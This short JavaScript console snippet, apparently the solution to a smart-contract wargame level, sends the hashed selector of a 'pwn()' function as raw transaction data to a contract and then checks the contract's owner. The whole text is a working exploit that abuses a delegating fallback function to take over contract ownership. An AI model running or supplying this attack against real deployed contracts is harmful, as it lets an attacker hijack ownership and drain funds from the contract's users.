pwn = web3.utils.sha3("pwn()")
await contract.sendTransaction({data:pwn})
await contract.owner()
